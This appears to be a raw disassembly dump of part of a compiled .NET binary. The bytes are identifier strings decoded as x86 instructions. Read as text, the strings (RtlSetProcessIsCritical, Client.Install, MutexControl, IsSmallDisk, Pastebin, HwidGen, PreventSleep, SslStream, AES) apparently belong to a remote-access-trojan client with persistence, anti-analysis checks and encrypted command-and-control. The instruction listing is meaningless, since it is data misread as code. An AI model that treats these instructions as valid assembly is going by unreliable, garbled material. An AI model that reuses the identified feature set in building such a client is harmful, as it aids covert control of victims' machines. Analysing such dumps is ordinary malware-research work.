  4064bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4064c1:	67 74 68             	addr16 je 0x40652c
  4064c4:	00 55 72             	add    %dl,0x72(%ebp)
  4064c7:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4064cd:	00 6f 62             	add    %ch,0x62(%edi)
  4064d0:	6a 00                	push   $0x0
  4064d2:	4d                   	dec    %ebp
  4064d3:	65 73 73             	gs jae 0x406549
  4064d6:	61                   	popa
  4064d7:	67 65 50             	addr16 gs push %eax
  4064da:	61                   	popa
  4064db:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4064de:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4064e5:	61                   	popa
  4064e6:	67 65 50             	addr16 gs push %eax
  4064e9:	61                   	popa
  4064ea:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064ed:	4d                   	dec    %ebp
  4064ee:	73 67                	jae    0x406557
  4064f0:	50                   	push   %eax
  4064f1:	61                   	popa
  4064f2:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4064f5:	41                   	inc    %ecx
  4064f6:	73 79                	jae    0x406571
  4064f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4064f9:	63 43 61             	arpl   %eax,0x61(%ebx)
  4064fc:	6c                   	insb   (%dx),%es:(%edi)
  4064fd:	6c                   	insb   (%dx),%es:(%edi)
  4064fe:	62 61 63             	bound  %esp,0x63(%ecx)
  406501:	6b 00 52             	imul   $0x52,(%eax),%eax
  406504:	65 6d                	gs insl (%dx),%es:(%edi)
  406506:	6f                   	outsl  %ds:(%esi),(%dx)
  406507:	74 65                	je     0x40656e
  406509:	43                   	inc    %ebx
  40650a:	65 72 74             	gs jb  0x406581
  40650d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  406514:	56                   	push   %esi
  406515:	61                   	popa
  406516:	6c                   	insb   (%dx),%es:(%edi)
  406517:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  40651e:	43 
  40651f:	61                   	popa
  406520:	6c                   	insb   (%dx),%es:(%edi)
  406521:	6c                   	insb   (%dx),%es:(%edi)
  406522:	62 61 63             	bound  %esp,0x63(%ecx)
  406525:	6b 00 54             	imul   $0x54,(%eax),%eax
  406528:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  40652f:	6c                   	insb   (%dx),%es:(%edi)
  406530:	62 61 63             	bound  %esp,0x63(%ecx)
  406533:	6b 00 75             	imul   $0x75,(%eax),%eax
  406536:	6e                   	outsb  %ds:(%esi),(%dx)
  406537:	70 61                	jo     0x40659a
  406539:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  40653c:	6d                   	insl   (%dx),%es:(%edi)
  40653d:	73 67                	jae    0x4065a6
  40653f:	70 61                	jo     0x4065a2
  406541:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  406544:	52                   	push   %edx
  406545:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40654c:	4b 65 
  40654e:	79 50                	jns    0x4065a0
  406550:	65 72 6d             	gs jb  0x4065c0
  406553:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  40655a:	68 65 63 6b 00       	push   $0x6b6365
  40655f:	46                   	inc    %esi
  406560:	6c                   	insb   (%dx),%es:(%edi)
  406561:	75 73                	jne    0x4065d6
  406563:	68 46 69 6e 61       	push   $0x616e6946
  406568:	6c                   	insb   (%dx),%es:(%edi)
  406569:	42                   	inc    %edx
  40656a:	6c                   	insb   (%dx),%es:(%edi)
  40656b:	6f                   	outsl  %ds:(%esi),(%dx)
  40656c:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40656f:	49                   	dec    %ecx
  406570:	73 53                	jae    0x4065c5
  406572:	6d                   	insl   (%dx),%es:(%edi)
  406573:	61                   	popa
  406574:	6c                   	insb   (%dx),%es:(%edi)
  406575:	6c                   	insb   (%dx),%es:(%edi)
  406576:	44                   	inc    %esp
  406577:	69 73 6b 00 52 74 6c 	imul   $0x6c745200,0x6b(%ebx),%esi
  40657e:	53                   	push   %ebx
  40657f:	65 74 50             	gs je  0x4065d2
  406582:	72 6f                	jb     0x4065f3
  406584:	63 65 73             	arpl   %esp,0x73(%ebp)
  406587:	73 49                	jae    0x4065d2
  406589:	73 43                	jae    0x4065ce
  40658b:	72 69                	jb     0x4065f6
  40658d:	74 69                	je     0x4065f8
  40658f:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  406592:	00 50 72             	add    %dl,0x72(%eax)
  406595:	6f                   	outsl  %ds:(%esi),(%dx)
  406596:	63 65 73             	arpl   %esp,0x73(%ebp)
  406599:	73 43                	jae    0x4065de
  40659b:	72 69                	jb     0x406606
  40659d:	74 69                	je     0x406608
  40659f:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4065a2:	00 4e 65             	add    %cl,0x65(%esi)
  4065a5:	74 77                	je     0x40661e
  4065a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4065a8:	72 6b                	jb     0x406615
  4065aa:	43                   	inc    %ebx
  4065ab:	72 65                	jb     0x406612
  4065ad:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4065b0:	74 69                	je     0x40661b
  4065b2:	61                   	popa
  4065b3:	6c                   	insb   (%dx),%es:(%edi)
  4065b4:	00 53 79             	add    %dl,0x79(%ebx)
  4065b7:	73 74                	jae    0x40662d
  4065b9:	65 6d                	gs insl (%dx),%es:(%edi)
  4065bb:	2e 53                	cs push %ebx
  4065bd:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4065c1:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  4065c8:	6e 
  4065c9:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065cc:	61                   	popa
  4065cd:	6c                   	insb   (%dx),%es:(%edi)
  4065ce:	00 57 69             	add    %dl,0x69(%edi)
  4065d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4065d2:	64 6f                	outsl  %fs:(%esi),(%dx)
  4065d4:	77 73                	ja     0x406649
  4065d6:	50                   	push   %eax
  4065d7:	72 69                	jb     0x406642
  4065d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4065da:	63 69 70             	arpl   %ebp,0x70(%ecx)
  4065dd:	61                   	popa
  4065de:	6c                   	insb   (%dx),%es:(%edi)
  4065df:	00 41 72             	add    %al,0x72(%ecx)
  4065e2:	65 45                	gs inc %ebp
  4065e4:	71 75                	jno    0x40665b
  4065e6:	61                   	popa
  4065e7:	6c                   	insb   (%dx),%es:(%edi)
  4065e8:	00 67 65             	add    %ah,0x65(%edi)
  4065eb:	74 5f                	je     0x40664c
  4065ed:	49                   	dec    %ecx
  4065ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4065ef:	74 65                	je     0x406656
  4065f1:	72 76                	jb     0x406669
  4065f3:	61                   	popa
  4065f4:	6c                   	insb   (%dx),%es:(%edi)
  4065f5:	00 73 65             	add    %dh,0x65(%ebx)
  4065f8:	74 5f                	je     0x406659
  4065fa:	49                   	dec    %ecx
  4065fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4065fc:	74 65                	je     0x406663
  4065fe:	72 76                	jb     0x406676
  406600:	61                   	popa
  406601:	6c                   	insb   (%dx),%es:(%edi)
  406602:	00 43 6c             	add    %al,0x6c(%ebx)
  406605:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  40660c:	73 74                	jae    0x406682
  40660e:	61                   	popa
  40660f:	6c                   	insb   (%dx),%es:(%edi)
  406610:	6c                   	insb   (%dx),%es:(%edi)
  406611:	00 6b 65             	add    %ch,0x65(%ebx)
  406614:	72 6e                	jb     0x406684
  406616:	65 6c                	gs insb (%dx),%es:(%edi)
  406618:	33 32                	xor    (%edx),%esi
  40661a:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40661d:	6c                   	insb   (%dx),%es:(%edi)
  40661e:	00 75 73             	add    %dh,0x73(%ebp)
  406621:	65 72 33             	gs jb  0x406657
  406624:	32 2e                	xor    (%esi),%ch
  406626:	64 6c                	fs insb (%dx),%es:(%edi)
  406628:	6c                   	insb   (%dx),%es:(%edi)
  406629:	00 6e 74             	add    %ch,0x74(%esi)
  40662c:	64 6c                	fs insb (%dx),%es:(%edi)
  40662e:	6c                   	insb   (%dx),%es:(%edi)
  40662f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406632:	6c                   	insb   (%dx),%es:(%edi)
  406633:	00 4b 69             	add    %cl,0x69(%ebx)
  406636:	6c                   	insb   (%dx),%es:(%edi)
  406637:	6c                   	insb   (%dx),%es:(%edi)
  406638:	00 50 6f             	add    %dl,0x6f(%eax)
  40663b:	6c                   	insb   (%dx),%es:(%edi)
  40663c:	6c                   	insb   (%dx),%es:(%edi)
  40663d:	00 4d 75             	add    %cl,0x75(%ebp)
  406640:	74 65                	je     0x4066a7
  406642:	78 43                	js     0x406687
  406644:	6f                   	outsl  %ds:(%esi),(%dx)
  406645:	6e                   	outsb  %ds:(%esi),(%dx)
  406646:	74 72                	je     0x4066ba
  406648:	6f                   	outsl  %ds:(%esi),(%dx)
  406649:	6c                   	insb   (%dx),%es:(%edi)
  40664a:	00 46 69             	add    %al,0x69(%esi)
  40664d:	6c                   	insb   (%dx),%es:(%edi)
  40664e:	65 53                	gs push %ebx
  406650:	74 72                	je     0x4066c4
  406652:	65 61                	gs popa
  406654:	6d                   	insl   (%dx),%es:(%edi)
  406655:	00 4e 65             	add    %cl,0x65(%esi)
  406658:	74 77                	je     0x4066d1
  40665a:	6f                   	outsl  %ds:(%esi),(%dx)
  40665b:	72 6b                	jb     0x4066c8
  40665d:	53                   	push   %ebx
  40665e:	74 72                	je     0x4066d2
  406660:	65 61                	gs popa
  406662:	6d                   	insl   (%dx),%es:(%edi)
  406663:	00 53 73             	add    %dl,0x73(%ebx)
  406666:	6c                   	insb   (%dx),%es:(%edi)
  406667:	53                   	push   %ebx
  406668:	74 72                	je     0x4066dc
  40666a:	65 61                	gs popa
  40666c:	6d                   	insl   (%dx),%es:(%edi)
  40666d:	00 43 72             	add    %al,0x72(%ebx)
  406670:	79 70                	jns    0x4066e2
  406672:	74 6f                	je     0x4066e3
  406674:	53                   	push   %ebx
  406675:	74 72                	je     0x4066e9
  406677:	65 61                	gs popa
  406679:	6d                   	insl   (%dx),%es:(%edi)
  40667a:	00 4d 65             	add    %cl,0x65(%ebp)
  40667d:	6d                   	insl   (%dx),%es:(%edi)
  40667e:	6f                   	outsl  %ds:(%esi),(%dx)
  40667f:	72 79                	jb     0x4066fa
  406681:	53                   	push   %ebx
  406682:	74 72                	je     0x4066f6
  406684:	65 61                	gs popa
  406686:	6d                   	insl   (%dx),%es:(%edi)
  406687:	00 50 72             	add    %dl,0x72(%eax)
  40668a:	6f                   	outsl  %ds:(%esi),(%dx)
  40668b:	67 72 61             	addr16 jb 0x4066ef
  40668e:	6d                   	insl   (%dx),%es:(%edi)
  40668f:	00 67 65             	add    %ah,0x65(%edi)
  406692:	74 5f                	je     0x4066f3
  406694:	49                   	dec    %ecx
  406695:	74 65                	je     0x4066fc
  406697:	6d                   	insl   (%dx),%es:(%edi)
  406698:	00 67 65             	add    %ah,0x65(%edi)
  40669b:	74 5f                	je     0x4066fc
  40669d:	49                   	dec    %ecx
  40669e:	73 36                	jae    0x4066d6
  4066a0:	34 42                	xor    $0x42,%al
  4066a2:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  4066a9:	74 
  4066aa:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  4066b1:	65 6d                	gs insl (%dx),%es:(%edi)
  4066b3:	00 43 6c             	add    %al,0x6c(%ebx)
  4066b6:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  4066bd:	67 6f                	outsl  %ds:(%si),(%dx)
  4066bf:	72 69                	jb     0x40672a
  4066c1:	74 68                	je     0x40672b
  4066c3:	6d                   	insl   (%dx),%es:(%edi)
  4066c4:	00 53 79             	add    %dl,0x79(%ebx)
  4066c7:	6d                   	insl   (%dx),%es:(%edi)
  4066c8:	6d                   	insl   (%dx),%es:(%edi)
  4066c9:	65 74 72             	gs je  0x40673e
  4066cc:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4066d3:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4066da:	79 
  4066db:	6d                   	insl   (%dx),%es:(%edi)
  4066dc:	6d                   	insl   (%dx),%es:(%edi)
  4066dd:	65 74 72             	gs je  0x406752
  4066e0:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4066e7:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4066ee:	73 
  4066ef:	68 41 6c 67 6f       	push   $0x6f676c41
  4066f4:	72 69                	jb     0x40675f
  4066f6:	74 68                	je     0x406760
  4066f8:	6d                   	insl   (%dx),%es:(%edi)
  4066f9:	00 52 61             	add    %dl,0x61(%edx)
  4066fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4066fd:	64 6f                	outsl  %fs:(%esi),(%dx)
  4066ff:	6d                   	insl   (%dx),%es:(%edi)
  406700:	00 49 43             	add    %cl,0x43(%ecx)
  406703:	72 79                	jb     0x40677e
  406705:	70 74                	jo     0x40677b
  406707:	6f                   	outsl  %ds:(%esi),(%dx)
  406708:	54                   	push   %esp
  406709:	72 61                	jb     0x40676c
  40670b:	6e                   	outsb  %ds:(%esi),(%dx)
  40670c:	73 66                	jae    0x406774
  40670e:	6f                   	outsl  %ds:(%esi),(%dx)
  40670f:	72 6d                	jb     0x40677e
  406711:	00 45 6e             	add    %al,0x6e(%ebp)
  406714:	75 6d                	jne    0x406783
  406716:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40671a:	6f                   	outsl  %ds:(%esi),(%dx)
  40671b:	6f                   	outsl  %ds:(%esi),(%dx)
  40671c:	6c                   	insb   (%dx),%es:(%edi)
  40671d:	65 61                	gs popa
  40671f:	6e                   	outsb  %ds:(%esi),(%dx)
  406720:	00 48 77             	add    %cl,0x77(%eax)
  406723:	69 64 47 65 6e 00 4d 	imul   $0x614d006e,0x65(%edi,%eax,2),%esp
  40672a:	61 
  40672b:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  406732:	43                   	inc    %ebx
  406733:	68 61 69 6e 00       	push   $0x6e6961
  406738:	63 68 61             	arpl   %ebp,0x61(%eax)
  40673b:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  406742:	6f                   	outsl  %ds:(%esi),(%dx)
  406743:	6d                   	insl   (%dx),%es:(%edi)
  406744:	61                   	popa
  406745:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40674c:	43                   	inc    %ebx
  40674d:	75 72                	jne    0x4067c1
  40674f:	72 65                	jb     0x4067b6
  406751:	6e                   	outsb  %ds:(%esi),(%dx)
  406752:	74 44                	je     0x406798
  406754:	6f                   	outsl  %ds:(%esi),(%dx)
  406755:	6d                   	insl   (%dx),%es:(%edi)
  406756:	61                   	popa
  406757:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  40675e:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  406762:	00 49 73             	add    %cl,0x73(%ecx)
  406765:	41                   	inc    %ecx
  406766:	64 6d                	fs insl (%dx),%es:(%edi)
  406768:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40676f:	00 47 65             	add    %al,0x65(%edi)
  406772:	74 46                	je     0x4067ba
  406774:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40677b:	57 
  40677c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  406783:	78 
  406784:	74 65                	je     0x4067eb
  406786:	6e                   	outsb  %ds:(%esi),(%dx)
  406787:	73 69                	jae    0x4067f2
  406789:	6f                   	outsl  %ds:(%esi),(%dx)
  40678a:	6e                   	outsb  %ds:(%esi),(%dx)
  40678b:	00 67 65             	add    %ah,0x65(%edi)
  40678e:	74 5f                	je     0x4067ef
  406790:	4f                   	dec    %edi
  406791:	53                   	push   %ebx
  406792:	56                   	push   %esi
  406793:	65 72 73             	gs jb  0x406809
  406796:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40679d:	6c                   	insb   (%dx),%es:(%edi)
  40679e:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4067a5:	00 53 79             	add    %dl,0x79(%ebx)
  4067a8:	73 74                	jae    0x40681e
  4067aa:	65 6d                	gs insl (%dx),%es:(%edi)
  4067ac:	2e 53                	cs push %ebx
  4067ae:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4067b2:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4067b9:	68 
  4067ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067bc:	74 69                	je     0x406827
  4067be:	63 61 74             	arpl   %esp,0x74(%ecx)
  4067c1:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4067c8:	74 65                	je     0x40682f
  4067ca:	6d                   	insl   (%dx),%es:(%edi)
  4067cb:	2e 52                	cs push %edx
  4067cd:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4067d0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4067d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4067d6:	00 58 35             	add    %bl,0x35(%eax)
  4067d9:	30 39                	xor    %bh,(%ecx)
  4067db:	43                   	inc    %ebx
  4067dc:	65 72 74             	gs jb  0x406853
  4067df:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4067e6:	43                   	inc    %ebx
  4067e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e8:	6c                   	insb   (%dx),%es:(%edi)
  4067e9:	6c                   	insb   (%dx),%es:(%edi)
  4067ea:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4067ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f0:	00 4d 61             	add    %cl,0x61(%ebp)
  4067f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f4:	61                   	popa
  4067f5:	67 65 6d             	gs insl (%dx),%es:(%di)
  4067f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4067fa:	74 4f                	je     0x40684b
  4067fc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4067ff:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  406803:	6c                   	insb   (%dx),%es:(%edi)
  406804:	6c                   	insb   (%dx),%es:(%edi)
  406805:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40680a:	6e                   	outsb  %ds:(%esi),(%dx)
  40680b:	00 43 6c             	add    %al,0x6c(%ebx)
  40680e:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  406815:	6e                   	outsb  %ds:(%esi),(%dx)
  406816:	6e                   	outsb  %ds:(%esi),(%dx)
  406817:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40681c:	6e                   	outsb  %ds:(%esi),(%dx)
  40681d:	00 73 65             	add    %dh,0x65(%ebx)
  406820:	74 5f                	je     0x406881
  406822:	50                   	push   %eax
  406823:	6f                   	outsl  %ds:(%esi),(%dx)
  406824:	73 69                	jae    0x40688f
  406826:	74 69                	je     0x406891
  406828:	6f                   	outsl  %ds:(%esi),(%dx)
  406829:	6e                   	outsb  %ds:(%esi),(%dx)
  40682a:	00 43 72             	add    %al,0x72(%ebx)
  40682d:	79 70                	jns    0x40689f
  40682f:	74 6f                	je     0x4068a0
  406831:	67 72 61             	addr16 jb 0x406895
  406834:	70 68                	jo     0x40689e
  406836:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  40683d:	74 69                	je     0x4068a8
  40683f:	6f                   	outsl  %ds:(%esi),(%dx)
  406840:	6e                   	outsb  %ds:(%esi),(%dx)
  406841:	00 41 72             	add    %al,0x72(%ecx)
  406844:	67 75 6d             	addr16 jne 0x4068b4
  406847:	65 6e                	outsb  %gs:(%esi),(%dx)
  406849:	74 4e                	je     0x406899
  40684b:	75 6c                	jne    0x4068b9
  40684d:	6c                   	insb   (%dx),%es:(%edi)
  40684e:	45                   	inc    %ebp
  40684f:	78 63                	js     0x4068b4
  406851:	65 70 74             	gs jo  0x4068c8
  406854:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40685b:	75 6d                	jne    0x4068ca
  40685d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40685f:	74 45                	je     0x4068a6
  406861:	78 63                	js     0x4068c6
  406863:	65 70 74             	gs jo  0x4068da
  406866:	69 6f 6e 00 49 6d 61 	imul   $0x616d4900,0x6e(%edi),%ebp
  40686d:	67 65 43             	addr16 gs inc %ebx
  406870:	6f                   	outsl  %ds:(%esi),(%dx)
  406871:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  406876:	66 6f                	outsw  %ds:(%esi),(%dx)
  406878:	00 53 65             	add    %dl,0x65(%ebx)
  40687b:	6e                   	outsb  %ds:(%esi),(%dx)
  40687c:	64 49                	fs dec %ecx
  40687e:	6e                   	outsb  %ds:(%esi),(%dx)
  40687f:	66 6f                	outsw  %ds:(%esi),(%dx)
  406881:	00 46 69             	add    %al,0x69(%esi)
  406884:	6c                   	insb   (%dx),%es:(%edi)
  406885:	65 49                	gs dec %ecx
  406887:	6e                   	outsb  %ds:(%esi),(%dx)
  406888:	66 6f                	outsw  %ds:(%esi),(%dx)
  40688a:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40688e:	76 65                	jbe    0x4068f5
  406890:	49                   	dec    %ecx
  406891:	6e                   	outsb  %ds:(%esi),(%dx)
  406892:	66 6f                	outsw  %ds:(%esi),(%dx)
  406894:	00 46 69             	add    %al,0x69(%esi)
  406897:	6c                   	insb   (%dx),%es:(%edi)
  406898:	65 53                	gs push %ebx
  40689a:	79 73                	jns    0x40690f
  40689c:	74 65                	je     0x406903
  40689e:	6d                   	insl   (%dx),%es:(%edi)
  40689f:	49                   	dec    %ecx
  4068a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4068a1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068a3:	00 43 6f             	add    %al,0x6f(%ebx)
  4068a6:	6d                   	insl   (%dx),%es:(%edi)
  4068a7:	70 75                	jo     0x40691e
  4068a9:	74 65                	je     0x406910
  4068ab:	72 49                	jb     0x4068f6
  4068ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4068ae:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068b0:	00 43 53             	add    %al,0x53(%ebx)
  4068b3:	68 61 72 70 41       	push   $0x41707261
  4068b8:	72 67                	jb     0x406921
  4068ba:	75 6d                	jne    0x406929
  4068bc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068be:	74 49                	je     0x406909
  4068c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4068c1:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068c3:	00 50 72             	add    %dl,0x72(%eax)
  4068c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4068ca:	73 53                	jae    0x40691f
  4068cc:	74 61                	je     0x40692f
  4068ce:	72 74                	jb     0x406944
  4068d0:	49                   	dec    %ecx
  4068d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4068d2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4068d4:	00 50 72             	add    %dl,0x72(%eax)
  4068d7:	65 76 65             	gs jbe 0x40693f
  4068da:	6e                   	outsb  %ds:(%esi),(%dx)
  4068db:	74 53                	je     0x406930
  4068dd:	6c                   	insb   (%dx),%es:(%edi)
  4068de:	65 65 70 00          	gs gs jo 0x4068e2
  4068e2:	5a                   	pop    %edx
  4068e3:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  4068ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4068ec:	74 41                	je     0x40692f
  4068ee:	70 70                	jo     0x406960
  4068f0:	00 4d 69             	add    %cl,0x69(%ebp)
  4068f3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4068f6:	73 6f                	jae    0x406967
  4068f8:	66 74 2e             	data16 je 0x406929
  4068fb:	43                   	inc    %ebx
  4068fc:	53                   	push   %ebx
  4068fd:	68 61 72 70 00       	push   $0x707261
  406902:	47                   	inc    %edi
  406903:	72 6f                	jb     0x406974
  406905:	75 70                	jne    0x406977
  406907:	00 4e 6f             	add    %cl,0x6f(%esi)
  40690a:	72 6d                	jb     0x406979
  40690c:	61                   	popa
  40690d:	6c                   	insb   (%dx),%es:(%edi)
  40690e:	53                   	push   %ebx
  40690f:	74 61                	je     0x406972
  406911:	72 74                	jb     0x406987
  406913:	75 70                	jne    0x406985
  406915:	00 53 79             	add    %dl,0x79(%ebx)
  406918:	73 74                	jae    0x40698e
  40691a:	65 6d                	gs insl (%dx),%es:(%edi)
  40691c:	2e 4c                	cs dec %esp
  40691e:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  406925:	72 00                	jb     0x406927
  406927:	49                   	dec    %ecx
  406928:	6e                   	outsb  %ds:(%esi),(%dx)
  406929:	76 6f                	jbe    0x40699a
  40692b:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  40692f:	6d                   	insl   (%dx),%es:(%edi)
  406930:	62 65 72             	bound  %esp,0x72(%ebp)
  406933:	00 4d 44             	add    %cl,0x44(%ebp)
  406936:	35 43 72 79 70       	xor    $0x70797243,%eax
  40693b:	74 6f                	je     0x4069ac
  40693d:	53                   	push   %ebx
  40693e:	65 72 76             	gs jb  0x4069b7
  406941:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  406948:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  40694f:	41 
  406950:	43                   	inc    %ebx
  406951:	72 79                	jb     0x4069cc
  406953:	70 74                	jo     0x4069c9
  406955:	6f                   	outsl  %ds:(%esi),(%dx)
  406956:	53                   	push   %ebx
  406957:	65 72 76             	gs jb  0x4069d0
  40695a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  406961:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  406968:	73 
  406969:	43                   	inc    %ebx
  40696a:	72 79                	jb     0x4069e5
  40696c:	70 74                	jo     0x4069e2
  40696e:	6f                   	outsl  %ds:(%esi),(%dx)
  40696f:	53                   	push   %ebx
  406970:	65 72 76             	gs jb  0x4069e9
  406973:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40697a:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  406981:	72 
  406982:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  406989:	64 65 72 00          	fs gs jb 0x40698d
  40698d:	49                   	dec    %ecx
  40698e:	6e                   	outsb  %ds:(%esi),(%dx)
  40698f:	73 74                	jae    0x406a05
  406991:	61                   	popa
  406992:	6c                   	insb   (%dx),%es:(%edi)
  406993:	6c                   	insb   (%dx),%es:(%edi)
  406994:	46                   	inc    %esi
  406995:	6f                   	outsl  %ds:(%esi),(%dx)
  406996:	6c                   	insb   (%dx),%es:(%edi)
  406997:	64 65 72 00          	fs gs jb 0x40699b
  40699b:	49                   	dec    %ecx
  40699c:	64 53                	fs push %ebx
  40699e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4069a0:	64 65 72 00          	fs gs jb 0x4069a4
  4069a4:	73 65                	jae    0x406a0b
  4069a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4069a7:	64 65 72 00          	fs gs jb 0x4069ab
  4069ab:	4d                   	dec    %ebp
  4069ac:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4069b3:	74 2e                	je     0x4069e3
  4069b5:	43                   	inc    %ebx
  4069b6:	53                   	push   %ebx
  4069b7:	68 61 72 70 2e       	push   $0x2e707261
  4069bc:	52                   	push   %edx
  4069bd:	75 6e                	jne    0x406a2d
  4069bf:	74 69                	je     0x406a2a
  4069c1:	6d                   	insl   (%dx),%es:(%edi)
  4069c2:	65 42                	gs inc %edx
  4069c4:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4069cb:	61                   	popa
  4069cc:	6c                   	insb   (%dx),%es:(%edi)
  4069cd:	6c                   	insb   (%dx),%es:(%edi)
  4069ce:	53                   	push   %ebx
  4069cf:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4069d6:	65 
  4069d7:	72 00                	jb     0x4069d9
  4069d9:	47                   	inc    %edi
  4069da:	65 74 45             	gs je  0x406a22
  4069dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4069de:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4069e1:	65 72 00             	gs jb  0x4069e4
  4069e4:	67 65 74 5f          	addr16 gs je 0x406a47
